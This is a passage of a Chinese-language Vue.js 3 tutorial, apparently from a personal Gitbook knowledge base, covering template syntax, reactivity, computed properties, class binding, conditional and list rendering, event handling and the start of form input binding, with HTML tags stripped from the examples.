支持直接手写渲染函数而不采用模板。但请注意，这将不会享受到和模板同等级别的编译时优化。 文本插值 最基本的数据绑定形式是文本插值，它使用的是“Mustache”语法 (即双大括号)： Message: {{ msg }} 双大括号标签会被替换为相应组件实例中 msg 属性的值。同时每次 msg 属性更改时它也会同步更新。 原始 HTML 双大括号会将数据解释为纯文本，而不是 HTML。若想插入 HTML，你需要使用 v-html 指令： Using text interpolation: {{ rawHtml }} Using v-html directive: Using text interpolation: This should be red. Using v-html directive:This should be red. 这里我们遇到了一个新的概念。这里看到的 v-html attribute 被称为一个指令。指令由 v- 作为前缀，表明它们是一些由 Vue 提供的特殊 attribute，你可能已经猜到了，它们将为渲染的 DOM 应用特殊的响应式行为。这里我们做的事情简单来说就是：在当前组件实例上，将此元素的 innerHTML 与 rawHtml 属性保持同步。 span 的内容将会被替换为 rawHtml 属性的值，插值为纯 HTML——数据绑定将会被忽略。注意，你不能使用 v-html 来拼接组合模板，因为 Vue 不是一个基于字符串的模板引擎。在使用 Vue 时，应当使用组件作为 UI 重用和组合的基本单元。 [!TIP] 在网站上动态渲染任意 HTML 是非常危险的，因为这非常容易造成 XSS 漏洞。请仅在内容安全可信时再使用 v-html，并且永远不要使用用户提供的 HTML 内容。 Attribute 绑定 双大括号不能在 HTML attributes 中使用。想要响应式地绑定一个 attribute，应该使用 v-bind 指令： v-bind 指令指示 Vue 将元素的 id attribute 与组件的 dynamicId 属性保持一致。如果绑定的值是 null 或者 undefined，那么该 attribute 将会从渲染的元素上移除。 简写 因为 v-bind 非常常用，我们提供了特定的简写语法： 开头为 : 的 attribute 可能和一般的 HTML attribute 看起来不太一样，但它的确是合法的 attribute 名称字符，并且所有支持 Vue 的浏览器都能正确解析它。此外，他们不会出现在最终渲染的 DOM 中。简写语法是可选的，但相信在你了解了它更多的用处后，你应该会更喜欢它。 接下来的指引中，我们都将在示例中使用简写语法，因为这是在实际开发中更常见的用法。 布尔型 Attribute 布尔型 attribute 依据 true / false 值来决定 attribute 是否应该存在于该元素上。disabled 就是最常见的例子之一。 v-bind 在这种场景下的行为略有不同： Button 当 isButtonDisabled 为真值或一个空字符串 (即 ) 时，元素会包含这个 disabled attribute。而当其为其他假值时 attribute 将被忽略。 动态绑定多个值 data() { return { objectOfAttrs: { id: 'container', class: 'wrapper' } } } 通过不带参数的 v-bind，你可以将它们绑定到单个元素上: 使用 JavaScript 表达式 至此，我们仅在模板中绑定了一些简单的属性名。但是 Vue 实际上在所有的数据绑定中都支持完整的 JavaScript 表达式： {{ number + 1 }} {{ ok ? 'YES' : 'NO' }} {{ message.split('').reverse().join('') }} 这些表达式都会被作为 JavaScript ，以当前组件实例为作用域解析执行。 在 Vue 模板内，JavaScript 表达式可以被使用在如下场景上： 在文本插值中 (双大括号) 在任何 Vue 指令 (以 v- 开头的特殊 attribute) attribute 的值中 仅支持表达式 每个绑定仅支持单一表达式，也就是一段能够被求值的 JavaScript 代码。一个简单的判断方法是是否可以合法地写在 return 后面。 因此，下面的例子都是无效的： {{ var a = 1 }} {{ if (ok) { return message } }} 调用函数 可以在绑定的表达式中使用一个组件暴露的方法： {{ formatDate(date) }} [!TIP] 绑定在表达式中的方法在组件每次更新时都会被重新调用，因此不应该产生任何副作用，比如改变数据或触发异步操作。 受限的全局访问 模板中的表达式将被沙盒化，仅能够访问到有限的全局对象列表。该列表中会暴露常用的内置全局对象，比如 Math 和 Date。 没有显式包含在列表中的全局对象将不能在模板内表达式中访问，例如用户附加在 window 上的属性。然而，你也可以自行在 app.config.globalProperties 上显式地添加它们，供所有的 Vue 表达式使用。 指令 Directives 指令是带有 v- 前缀的特殊 attribute。Vue 提供了许多内置指令，包括上面我们所介绍的 v-bind 和 v-html。 指令 attribute 的期望值为一个 JavaScript 表达式 (除了少数几个例外，即之后要讨论到的 v-for、v-on 和 v-slot)。一个指令的任务是在其表达式的值变化时响应式地更新 DOM。以 v-if 为例： Now you see me 这里，v-if 指令会基于表达式 seen 的值的真假来移除/插入该 元素。 参数 Arguments 某些指令会需要一个“参数”，在指令名后通过一个冒号隔开做标识。例如用 v-bind 指令来响应式地更新一个 HTML attribute： ... ... 这里 href 就是一个参数，它告诉 v-bind 指令将表达式 url 的值绑定到元素的 href attribute 上。在简写中，参数前的一切 (例如 v-bind:) 都会被缩略为一个 : 字符。 另一个例子是 v-on 指令，它将监听 DOM 事件： ... ... 这里的参数是要监听的事件名称：click。v-on 有一个相应的缩写，即 @ 字符。我们之后也会讨论关于事件处理的更多细节。 动态参数 同样在指令参数上也可以使用一个 JavaScript 表达式，需要包含在一对方括号内： ... ... 这里的 attributeName 会作为一个 JavaScript 表达式被动态执行，计算得到的值会被用作最终的参数。举例来说，如果你的组件实例有一个数据属性 attributeName，其值为 \"href\"，那么这个绑定就等价于 v-bind:href。 相似地，你还可以将一个函数绑定到动态的事件名称上： ... 在此示例中，当 eventName 的值是 \"focus\" 时，v-on:[eventName] 就等价于 v-on:focus。 动态参数值的限制 动态参数中表达式的值应当是一个字符串，或者是 null。特殊值 null 意为显式移除该绑定。其他非字符串的值会触发警告。 动态参数语法的限制 动态参数表达式因为某些字符的缘故有一些语法限制，比如空格和引号，在 HTML attribute 名称中都是不合法的。例如下面的示例： ... 如果你需要传入一个复杂的动态参数，我们推荐使用计算属性替换复杂的表达式，也是 Vue 最基础的概念之一，我们很快就会讲到。 当使用 DOM 内嵌模板 (直接写在 HTML 文件里的模板) 时，我们需要避免在名称中使用大写字母，因为浏览器会强制将其转换为小写： ... 上面的例子将会在 DOM 内嵌模板中被转换为 :[someattr]。如果你的组件拥有 “someAttr” 属性而非 “someattr”，这段代码将不会工作。单文件组件内的模板不受此限制。 修饰符 Modifiers 修饰符是以点开头的特殊后缀，表明指令需要以一些特殊的方式被绑定。例如 .prevent 修饰符会告知 v-on 指令对触发的事件调用 event.preventDefault()： ... 之后在讲到 v-on 和 v-model 的功能时，你将会看到其他修饰符的例子。 最后，在这里你可以直观地看到完整的指令语法： Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 18:39:10 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/03.响应式基础.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/03.响应式基础.html","title":"03.响应式基础","keywords":"","body":"响应式基础 [!TIP] API 参考 本页和后面很多页面中都分别包含了选项式 API 和组合式 API 的示例代码。现在你选择的是 选项式 API。你可以使用左侧侧边栏顶部的 “API 风格偏好” 开关在 API 风格之间切换。 声明响应式状态 选用选项式 API 时，会用 data 选项来声明组件的响应式状态。此选项的值应为返回一个对象的函数。Vue 将在创建新组件实例的时候调用此函数，并将函数返回的对象用响应式系统进行包装。此对象的所有顶层属性都会被代理到组件实例 (即方法和生命周期钩子中的 this) 上。 export default { data() { return { count: 1 } }, // `mounted` 是生命周期钩子，之后我们会讲到 mounted() { // `this` 指向当前组件实例 console.log(this.count) // => 1 // 数据属性也可以被更改 this.count = 2 } } 这些实例上的属性仅在实例首次创建时被添加，因此你需要确保它们都出现在 data 函数返回的对象上。若所需的值还未准备好，在必要时也可以使用 null、undefined 或者其他一些值占位。 虽然也可以不在 data 上定义，直接向组件实例添加新属性，但这个属性将无法触发响应式更新。 Vue 在组件实例上暴露的内置 API 使用 $ 作为前缀。它同时也为内部属性保留 _ 前缀。因此，你应该避免在顶层 data 上使用任何以这些字符作前缀的属性。 响应式代理 vs. 原始值 在 Vue 3 中，数据是基于 JavaScript Proxy（代理） 实现响应式的。使用过 Vue 2 的用户可能需要注意下面这样的边界情况： export default { data() { return { someObject: {} } }, mounted() { const newObject = {} this.someObject = newObject console.log(newObject === this.someObject) // false } } 当你在赋值后再访问 this.someObject，此值已经是原来的 newObject 的一个响应式代理。与 Vue 2 不同的是，这里原始的 newObject 不会变为响应式：请确保始终通过 this 来访问响应式状态。 声明方法 要为组件添加方法，我们需要用到 methods 选项。它应该是一个包含所有方法的对象: export default { data() { return { count: 0 } }, methods: { increment() { this.count++ } }, mounted() { // 在其他方法或是生命周期中也可以调用方法 this.increment() } } Vue 自动为 methods 中的方法绑定了永远指向组件实例的 this。这确保了方法在作为事件监听器或回调函数时始终保持正确的 this。你不应该在定义 methods 时使用箭头函数，因为箭头函数没有自己的 this 上下文。 export default { methods: { increment: () => { // 反例：无法访问此处的 `this`! } } 和组件实例上的其他属性一样，方法也可以在模板上被访问。在模板中它们常常被用作事件监听器： {{ count }} DOM 更新时机 当你更改响应式状态后，DOM 会自动更新。然而，你得注意 DOM 的更新并不是同步的。相反，Vue 将缓冲它们直到更新周期的 “下个时机” 以确保无论你进行了多少次状态更改，每个组件都只更新一次。 若要等待一个状态改变后的 DOM 更新完成，你可以使用 nextTick() 这个全局 API： import { nextTick } from 'vue' export default { methods: { increment() { this.count++ nextTick(() => { // 访问更新后的 DOM }) } } } 深层响应性 在 Vue 中，状态都是默认深层响应式的。这意味着即使在更改深层次的对象或数组，你的改动也能被检测到。 export default { data() { return { obj: { nested: { count: 0 }, arr: ['foo', 'bar'] } } }, methods: { mutateDeeply() { // 以下都会按照期望工作 this.obj.nested.count++ this.obj.arr.push('baz') } } } 你也可以直接创建一个浅层响应式对象。它们仅在顶层具有响应性，一般仅在某些特殊场景中需要。 有状态方法 在某些情况下，我们可能需要动态地创建一个方法函数，比如创建一个预置防抖的事件处理器： import { debounce } from 'lodash-es' export default { methods: { // 使用 Lodash 的防抖函数 click: debounce(function () { // ... 对点击的响应 ... }, 500) } } 不过这种方法对于被重用的组件来说是有问题的，因为这个预置防抖的函数是 有状态的：它在运行时维护着一个内部状态。如果多个组件实例都共享这同一个预置防抖的函数，那么它们之间将会互相影响。 要保持每个组件实例的防抖函数都彼此独立，我们可以改为在 created 生命周期钩子中创建这个预置防抖的函数： export default { created() { // 每个实例都有了自己的预置防抖的处理函数 this.debouncedClick = _.debounce(this.click, 500) }, unmounted() { // 最好是在组件卸载时 // 清除掉防抖计时器 this.debouncedClick.cancel() }, methods: { click() { // ... 对点击的响应 ... } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 14:08:15 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/04.计算属性.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/04.计算属性.html","title":"04.计算属性","keywords":"","body":"计算属性 基础示例 模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。比如说，我们有这样一个包含嵌套数组的对象： export default { data() { return { author: { name: 'John Doe', books: [ 'Vue 2 - Advanced Guide', 'Vue 3 - Basic Guide', 'Vue 4 - The Mystery' ] } } } } 我们想根据 author 是否已有一些书籍来展示不同的信息： Has published books: {{ author.books.length > 0 ? 'Yes' : 'No' }} 这里的模板看起来有些复杂。我们必须认真看好一会儿才能明白它的计算依赖于 author.books。更重要的是，如果在模板中需要不止一次这样的计算，我们可不想将这样的代码在模板里重复好多遍。 因此我们推荐使用计算属性来描述依赖响应式状态的复杂逻辑。这是重构后的示例： export default { data() { return { author: { name: 'John Doe', books: [ 'Vue 2 - Advanced Guide', 'Vue 3 - Basic Guide', 'Vue 4 - The Mystery' ] } } }, computed: { // 一个计算属性的 getter publishedBooksMessage() { // `this` 指向当前组件实例 return this.author.books.length > 0 ? 'Yes' : 'No' } } } Has published books: {{ publishedBooksMessage }} 我们在这里定义了一个计算属性 publishedBooksMessage。 更改此应用的 data 中 books 数组的值后，可以看到 publishedBooksMessage 也会随之改变。 在模板中使用计算属性的方式和一般的属性并无二致。Vue 会检测到 this.publishedBooksMessage 依赖于 this.author.books，所以当 this.author.books 改变时，任何依赖于 this.publishedBooksMessage 的绑定都将同时更新。 计算属性缓存 vs 方法 你可能注意到我们在表达式中像这样调用一个函数也会获得和计算属性相同的结果： {{ calculateBooksMessage() }} // 组件中 methods: { calculateBooksMessage() { return this.author.books.length > 0 ? 'Yes' : 'No' } } 若我们将同样的函数定义为一个方法而不是计算属性，两种方式在结果上确实是完全相同的，然而，不同之处在于计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算。这意味着只要 author.books 不改变，无论多少次访问 publishedBooksMessage 都会立即返回先前的计算结果，而不用重复执行 getter 函数。 这也解释了为什么下面的计算属性永远不会更新，因为 Date.now() 并不是一个响应式依赖： computed: { now() { return Date.now() } } 相比之下，方法调用总是会在重渲染发生时再次执行函数。 为什么需要缓存呢？想象一下我们有一个非常耗性能的计算属性 list，需要循环一个巨大的数组并做许多计算逻辑，并且可能也有其他计算属性依赖于 list。没有缓存的话，我们会重复执行非常多次 list 的 getter，然而这实际上没有必要！如果你确定不需要缓存，那么也可以使用方法调用。 可写计算属性!important 计算属性默认是只读的。当你尝试修改一个计算属性时，你会收到一个运行时警告。只在某些特殊场景中你可能才需要用到“可写”的属性，你可以通过同时提供 getter 和 setter 来创建： export default { data() { return { firstName: 'John', lastName: 'Doe' } }, computed: { fullName: { // getter get() { return this.firstName + ' ' + this.lastName }, // setter set(newValue) { // 注意：我们这里使用的是解构赋值语法 [this.firstName, this.lastName] = newValue.split(' ') } } } } 现在当你再运行 this.fullName = 'John Doe' 时，setter 会被调用而 this.firstName 和 this.lastName 会随之更新。 最佳实践 Getter 不应有副作用 计算属性的 getter 应只做计算而没有任何其他的副作用，这一点非常重要，请务必牢记。举例来说，不要在 getter 中做异步请求或者更改 DOM！一个计算属性的声明中描述的是如何根据其他值派生一个值。因此 getter 的职责应该仅为计算和返回该值。在之后的指引中我们会讨论如何使用监听器根据其他响应式状态的变更来创建副作用。 避免直接修改计算属性值 从计算属性返回的值是派生状态。可以把它看作是一个“临时快照”，每当源状态发生变化时，就会创建一个新的快照。更改快照是没有意义的，因此计算属性的返回值应该被视为只读的，并且永远不应该被更改——应该更新它所依赖的源状态以触发新的计算。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 14:14:53 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/05.类与样式绑定.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/05.类与样式绑定.html","title":"05.类与样式绑定","keywords":"","body":"Class 与 Style 绑定 数据绑定的一个常见需求场景是操纵元素的 CSS class 列表和内联样式。因为 class 和 style 都是 attribute，我们可以和其他 attribute 一样使用 v-bind 将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦且易出错的。因此，Vue 专门为 class 和 style 的 v-bind 用法提供了特殊的功能增强。除了字符串外，表达式的值也可以是对象或数组。 绑定 HTML class 绑定对象 我们可以给 :class (v-bind:class 的缩写) 传递一个对象来动态切换 class： 上面的语法表示 active 是否存在取决于数据属性 isActive 的真假值。 你可以在对象中写多个字段来操作多个 class。此外，:class 指令也可以和一般的 class attribute 共存。举例来说，下面这样的状态： data() { return { isActive: true, hasError: false } } 配合以下模板： 渲染的结果会是： 当 isActive 或者 hasError 改变时，class 列表会随之更新。举例来说，如果 hasError 变为 true，class 列表也会变成 \"static active text-danger\"。 绑定的对象并不一定需要写成内联字面量的形式，也可以直接绑定一个对象： data() { return { classObject: { active: true, 'text-danger': false } } } 这也会渲染出相同的结果。我们也可以绑定一个返回对象的计算属性。这是一个常见且很有用的技巧： data() { return { isActive: true, error: null } }, computed: { classObject() { return { active: this.isActive && !this.error, 'text-danger': this.error && this.error.type === 'fatal' } } } 绑定数组 我们可以给 :class 绑定一个数组来渲染多个 CSS class： data() { return { activeClass: 'active', errorClass: 'text-danger' } } 渲染的结果是： 如果你也想在数组中有条件地渲染某个 class，你可以使用三元表达式： errorClass 会一直存在，但 activeClass 只会在 isActive 为真时才存在。 然而，这可能在有多个依赖条件的 class 时会有些冗长。因此也可以在数组中嵌套对象： 在组件上使用 本节假设你已经有 Vue 组件的知识基础。如果没有，你也可以暂时跳过，以后再阅读。 对于只有一个根元素的组件，当你使用了 class attribute 时，这些 class 会被添加到根元素上并与该元素上已有的 class 合并 举例来说，如果你声明了一个组件名叫 MyComponent，模板如下： Hi! 在使用时添加一些 class： 渲染出的 HTML 为： Hi! Class 的绑定也是同样的： 当 isActive 为真时，被渲染的 HTML 会是： Hi! 如果你的组件有多个根元素，你将需要指定哪个根元素来接收这个 class。你可以通过组件的 $attrs 属性来实现指定： Hi! This is a child component 这将被渲染为： Hi! This is a child component Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 14:21:54 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/06.条件渲染.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/06.条件渲染.html","title":"06.条件渲染","keywords":"","body":"条件渲染 v-if v-if 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回真值时才被渲染 Vue is awesome! v-else 你也可以使用 v-else 为 v-if 添加一个“else 区块”。 Toggle Vue is awesome! Oh no 😢 一个 v-else 元素必须跟在一个 v-if 或者 v-else-if 元素后面，否则它将不会被识别。 v-else-if 顾名思义，v-else-if 提供的是相应于 v-if 的“else if 区块”。它可以连续多次重复使用： A B C Not A/B/C 和 v-else 类似，一个使用 v-else-if 的元素必须紧跟在一个 v-if 或一个 v-else-if 元素后面。 上的 v-if 因为 v-if 是一个指令，他必须依附于某个元素。但如果我们想要切换不止一个元素呢？在这种情况下我们可以在一个 元素上使用 v-if，这只是一个不可见的包装器元素，最后渲染的结果并不会包含这个 元素。 Title Paragraph 1 Paragraph 2 v-else 和 v-else-if 也可以在 上使用。 v-show 另一个可以用来按条件显示一个元素的指令是 v-show。其用法基本一样： Hello! 不同之处在于 v-show 会在 DOM 渲染中保留该元素；v-show 仅切换了该元素上名为 display 的 CSS 属性。 v-show 不支持在 元素上使用，也不能和 v-else 搭配使用。 v-if vs. v-show v-if 是“真实的”按条件渲染，因为它确保了在切换时，条件区块内的事件监听器和子组件都会被销毁与重建。 v-if 也是惰性的：如果在初次渲染时条件值为 false，则不会做任何事。条件区块只有当条件首次变为 true 时才被渲染。 相比之下，v-show 简单许多，元素无论初始条件如何，始终会被渲染，只有 CSS display 属性会被切换。 总的来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要频繁切换，则使用 v-show 较好；如果在运行时绑定条件很少改变，则 v-if 会更合适。 v-if 和 v-for [!TIP] 警告 同时使用 v-if 和 v-for 是不推荐的，因为这样二者的优先级不明显。请查看风格指南获得更多信息。 当 v-if 和 v-for 同时存在于一个元素上的时候，v-if 会首先被执行。请查看列表渲染指南获取更多细节。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 14:25:59 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/07.列表渲染.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/07.列表渲染.html","title":"07.列表渲染","keywords":"","body":"列表渲染 v-for 我们可以使用 v-for 指令基于一个数组来渲染一个列表。v-for 指令的值需要使用 item in items 形式的特殊语法，其中 items 是源数据的数组，而 item 是迭代项的别名： data() { return { items: [{ message: 'Foo' }, { message: 'Bar' }] } } {{ item.message }} 在 v-for 块中可以完整地访问父作用域内的属性和变量。v-for 也支持使用可选的第二个参数表示当前项的位置索引。 data() { return { parentMessage: 'Parent', items: [{ message: 'Foo' }, { message: 'Bar' }] } } {{ parentMessage }} - {{ index }} - {{ item.message }} Parent - 0 - Foo Parent - 1 - Bar v-for 变量的作用域和下面的 JavaScript 代码很类似： const parentMessage = 'Parent' const items = [ /* ... */ ] items.forEach((item, index) => { // 可以访问外层的 `parentMessage` // 而 `item` 和 `index` 只在这个作用域可用 console.log(parentMessage, item.message, index) }) 注意 v-for 是如何对应 forEach 回调的函数签名的。实际上，你也可以在定义 v-for 的变量别名时使用解构，和解构函数参数类似： {{ message }} {{ message }} {{ index }} 对于多层嵌套的 v-for，作用域的工作方式和函数的作用域很类似。每个 v-for 作用域都可以访问到父级作用域： {{ item.message }} {{ childItem }} 你也可以使用 of 作为分隔符来替代 in，这更接近 JavaScript 的迭代器语法： v-for 与对象 你也可以使用 v-for 来遍历一个对象的所有属性。遍历的顺序会基于对该对象调用 Object.keys() 的返回值来决定。 data() { return { myObject: { title: 'How to do lists in Vue', author: 'Jane Doe', publishedAt: '2016-04-10' } } } {{ value }} 可以通过提供第二个参数表示属性名 (例如 key)： {{ key }}: {{ value }} 第三个参数表示位置索引： {{ index }}. {{ key }}: {{ value }} 在 v-for 里使用范围值 v-for 可以直接接受一个整数值。在这种用例中，会将该模板基于 1...n 的取值范围重复多次。 {{ n }} 注意此处 n 的初值是从 1 开始而非 0。 上的 v-for 与模板上的 v-if 类似，你也可以在 标签上使用 v-for 来渲染一个包含多个元素的块。例如： {{ item.msg }} v-for 与 v-if [!TIP] 注意 同时使用 v-if 和 v-for 是不推荐的，因为这样二者的优先级不明显。请转阅风格指南查看更多细节。 当它们同时存在于一个节点上时，v-if 比 v-for 的优先级更高。这意味着 v-if 的条件将无法访问到 v-for 作用域内定义的变量别名： {{ todo.name }} 在外新包装一层 再在其上使用 v-for 可以解决这个问题 (这也更加明显易读) {{ todo.name }} 通过 key 管理状态 Vue 默认按照“就地更新”的策略来更新通过 v-for 渲染的元素列表。当数据项的顺序改变时，Vue 不会随之移动 DOM 元素的顺序，而是就地更新每个元素，确保它们在原本指定的索引位置上渲染。 默认模式是高效的，但只适用于列表渲染输出的结果不依赖子组件状态或者临时 DOM 状态 (例如表单输入值) 的情况。 为了给 Vue 一个提示，以便它可以跟踪每个节点的标识，从而重用和重新排序现有的元素，你需要为每个元素对应的块提供一个唯一的 key attribute： 当你使用 时，key 应该被放置在这个 容器上： {{ todo.name }} [!TIP] 注意 key 在这里是一个通过 v-bind 绑定的特殊 attribute。请不要和在 v-for 中使用对象里所提到的对象属性名相混淆。 推荐在任何可行的时候为 v-for 提供一个 key attribute，除非所迭代的 DOM 内容非常简单 (例如：不包含组件或有状态的 DOM 元素)，或者你想有意采用默认行为来提高性能。 key 绑定的值期望是一个基础类型的值，例如字符串或 number 类型。不要用对象作为 v-for 的 key。关于 key attribute 的更多用途细节，请参阅 key API 文档。 组件上使用 v-for 这一小节假设你已了解组件的相关知识，或者你也可以先跳过这里，之后再回来看。 我们可以直接在组件上使用 v-for，和在一般的元素上使用没有区别 (别忘记提供一个 key)： 但是，这不会自动将任何数据传递给组件，因为组件有自己独立的作用域。为了将迭代后的数据传递到组件中，我们还需要传递 props： 不自动将 item 注入组件的原因是，这会使组件与 v-for 的工作方式紧密耦合。明确其数据的来源可以使组件在其他情况下重用。 数组变化侦测 变更方法 Vue 能够侦听响应式数组的变更方法，并在它们被调用时触发相关的更新。这些变更方法包括： push() pop() shift() unshift() splice() sort() reverse() 替换一个数组 变更方法，顾名思义，就是会对调用它们的原数组进行变更。相对地，也有一些不可变 (immutable) 方法，例如 filter()，concat() 和 slice()，这些都不会更改原数组，而总是返回一个新数组。当遇到的是非变更方法时，我们需要将旧的数组替换为新的： this.items = this.items.filter((item) => item.message.match(/Foo/)) 你可能认为这将导致 Vue 丢弃现有的 DOM 并重新渲染整个列表——幸运的是，情况并非如此。Vue 实现了一些巧妙的方法来最大化对 DOM 元素的重用，因此用另一个包含部分重叠对象的数组来做替换，仍会是一种非常高效的操作。 展示过滤或排序后的结果 有时，我们希望显示数组经过过滤或排序后的内容，而不实际变更或重置原始数据。在这种情况下，你可以创建返回已过滤或已排序数组的计算属性。 举例来说： data() { return { numbers: [1, 2, 3, 4, 5] } }, computed: { evenNumbers() { return this.numbers.filter(n => n % 2 === 0) } } {{ n }} 在计算属性不可行的情况下 (例如在多层嵌套的 v-for 循环中)，你可以使用以下方法： data() { return { sets: [[ 1, 2, 3, 4, 5 ], [6, 7, 8, 9, 10]] } }, methods: { even(numbers) { return numbers.filter(number => number % 2 === 0) } } {{ n }} 在计算属性中使用 reverse() 和 sort() 的时候务必小心！这两个方法将变更原始数组，计算函数中不应该这么做。请在调用这些方法之前创建一个原数组的副本： - return numbers.reverse() + return [...numbers].reverse() Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 14:41:30 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/08.事件处理.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/08.事件处理.html","title":"08.事件处理","keywords":"","body":"事件处理 监听事件 我们可以使用 v-on 指令 (简写为 @) 来监听 DOM 事件，并在事件触发时执行对应的 JavaScript。用法：v-on:click=\"handler\" 或 @click=\"handler\"。 事件处理器 (handler) 的值可以是： 内联事件处理器：事件被触发时执行的内联 JavaScript 语句 (与 onclick 类似)。 方法事件处理器：一个指向组件上定义的方法的属性名或是路径。 内联事件处理器 内联事件处理器通常用于简单场景，例如： data() { return { count: 0 } } Add 1 Count is: {{ count }} 方法事件处理器 随着事件处理器的逻辑变得愈发复杂，内联代码方式变得不够灵活。因此 v-on 也可以接受一个方法名或对某个方法的调用。 举例来说： data() { return { name: 'Vue.js' } }, methods: { greet(event) { // 方法中的 `this` 指向当前活跃的组件实例 alert(`Hello ${this.name}!`) // `event` 是 DOM 原生事件 if (event) { alert(event.target.tagName) } } } Greet 方法事件处理器会自动接收原生 DOM 事件并触发执行。在上面的例子中，我们能够通过被触发事件的 event.target.tagName 访问到该 DOM 元素。 方法与内联事件判断 模板编译器会通过检查 v-on 的值是否是合法的 JavaScript 标识符或属性访问路径来断定是何种形式的事件处理器。举例来说，foo、foo.bar 和 foo['bar'] 会被视为方法事件处理器，而 foo() 和 count++ 会被视为内联事件处理器。 在内联处理器中调用方法 除了直接绑定方法名，你还可以在内联事件处理器中调用方法。这允许我们向方法传入自定义参数以代替原生事件 methods: { say(message) { alert(message) } } Say hello Say bye 在内联事件处理器中访问事件参数 有时我们需要在内联事件处理器中访问原生 DOM 事件。你可以向该处理器方法传入一个特殊的 $event 变量，或者使用内联箭头函数： Submit warn('Form cannot be submitted yet.', event)\"> Submit methods: { warn(message, event) { // 这里可以访问 DOM 原生事件 if (event) { event.preventDefault() } alert(message) } } 事件修饰符 在处理事件时调用 event.preventDefault() 或 event.stopPropagation() 是很常见的。尽管我们可以直接在方法内调用，但如果方法能更专注于数据逻辑而不用去处理 DOM 事件的细节会更好。 为解决这一问题，Vue 为 v-on 提供了事件修饰符。修饰符是用 . 表示的指令后缀，包含以下这些： .stop .prevent .self .capture .once .passive ... [!TIP] 使用修饰符时需要注意调用顺序，因为相关代码是以相同的顺序生成的。因此使用 @click.prevent.self 会阻止元素及其子元素的所有点击事件的默认行为，而 @click.self.prevent 则只会阻止对元素本身的点击事件的默认行为。 .capture、.once 和 .passive 修饰符与原生 addEventListener 事件相对应： ... ... .passive 修饰符一般用于触摸事件的监听器，可以用来改善移动端设备的滚屏性能。 [!TIP] 请勿同时使用 .passive 和 .prevent，因为 .passive 已经向浏览器表明了你不想阻止事件的默认行为。如果你这么做了，则 .prevent 会被忽略，并且浏览器会抛出警告。 按键修饰符 在监听键盘事件时，我们经常需要检查特定的按键。Vue 允许在 v-on 或 @ 监听按键事件时添加按键修饰符。 你可以直接使用 KeyboardEvent.key 暴露的按键名称作为修饰符，但需要转为 kebab-case 形式。 在上面的例子中，仅会在 $event.key 为 'PageDown' 时调用事件处理。 按键别名 Vue 为一些常用的按键提供了别名： .enter .tab .delete (捕获“Delete”和“Backspace”两个按键) .esc .space .up .down .left .right 系统按键修饰符 你可以使用以下系统按键修饰符来触发鼠标或键盘事件监听器，只有当按键被按下时才会触发。 .ctrl .alt .shift .meta [!TIP] 在 Mac 键盘上，meta 是 Command 键 (⌘)。在 Windows 键盘上，meta 键是 Windows 键 (⊞)。在 Sun 微机系统键盘上，meta 是钻石键 (◆)。在某些键盘上，特别是 MIT 和 Lisp 机器的键盘及其后代版本的键盘，如 Knight 键盘，space-cadet 键盘，meta 都被标记为“META”。在 Symbolics 键盘上，meta 也被标识为“META”或“Meta”。 举例来说： Do something [!TIP] 请注意，系统按键修饰符和常规按键不同。与 keyup 事件一起使用时，该按键必须在事件发出时处于按下状态。换句话说，keyup.ctrl 只会在你仍然按住 ctrl 但松开了另一个键时被触发。若你单独松开 ctrl 键将不会触发。 .exact 修饰符 .exact 修饰符允许控制触发一个事件所需的确定组合的系统按键修饰符。 A A A 鼠标按键修饰符 .left .right .middle 这些修饰符将处理程序限定为由特定鼠标按键触发的事件。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 15:32:33 "},"知识库/04.编程开发/03.Web前端/01.Vue.js/09.表单输入绑定.html":{"url":"知识库/04.编程开发/03.Web前端/01.Vue.js/09.表单输入绑定.html","title":"09.表单输入绑定","keywords":"","body":"表单输入绑定 在前端处理表单时，我们常常需要将表单输入框的内容同步给 JavaScript 中相应的变量。手动连接值绑定和更改事件监听器可能会很麻烦： text = event.target.value\"> v-model 指令帮我们简化了这一步骤 另外，v-model 还可以用于各种不同类型的输入，、 元素。它会根据所使用的元素自动使用对应的 DOM 属性和事件组合： 文本类型的 和 元素会绑定 value property 并侦听 input 事件； 和 会绑定 checked property 并侦听 change 事件； 会绑定 value property 并侦听 change 事件。 [!TIP] v-model 会忽略任何表单元素上初始的 value、checked 或 selected attribute。它将始终将当前绑定的 JavaScript 状态视为数据的正确来源。你应该在 JavaScript 中使用data 选项来声明该初始值。 基本用法 文本 Message is: {{ message }} [!TIP] 注意 对于需要使用 IME 的语言 (中文，日文和韩文等)，你会发现 v-model 不会在 IME 输入还在拼字阶段时触发更新。如果你的确想在拼字阶段也触发更新，请直接使用自己的 input 事件监听器和 value 绑定而不要使用 v-model。 多行文本 Multiline message is: {{ message }} 注意在 中是不支持插值表达式的。请使用 v-model 来替代： {{ text }} 复选框 单一的复选框，绑定布尔类型值： {{ checked }} 我们也可以将多个复选框绑定到同一个数组或集合的值： export default { data() { return { checkedNames: [] } } } Checked names: {{ checkedNames }} Jack John Mike 在这个例子中，checkedNames 